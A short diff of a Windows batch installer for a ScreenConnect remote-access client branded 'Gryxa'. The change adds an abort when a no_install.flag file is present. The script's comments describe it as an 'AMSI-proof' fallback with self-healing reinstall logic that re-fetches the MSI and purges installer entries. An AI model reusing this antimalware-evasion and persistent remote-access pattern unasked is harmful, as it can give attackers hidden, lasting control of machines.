@@ -1,5 +1,6 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G14 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem OWN_GRYXA BUILD 20260804G15 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G15: honor no_install.flag — refuse HEAL/REINSTALL/mutate (manual recover scripts still work if flag absent).
 rem G14: HEAL try purge+/i BEFORE msiexec /x (avoids OUR_MSI_UNINSTALL + panel dupes when /i would have worked).
 rem G13: HEAL purge phantom Installer Products packed-GUID (L34) before fresh /i; also try ui.gryxa.com MSI.
 rem G12: HEAL 1060 wipe orphan FP dir + force re-fetch MSI before /x+/i.
@@ -37,7 +38,12 @@ set "DIR64=%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G14 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G15 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+
+if exist "%WD%\no_install.flag" (
+  echo [%DATE% %TIME%] NO_INSTALL_abort mode=%MODE%>>"%LOG%"
+  exit /b 0
+)
 
 rem G10: OBSERVE blocks REINSTALL/mutate-/x only — still allow HEAL start + 1060 /i
 if exist "%WD%\observe.flag" (
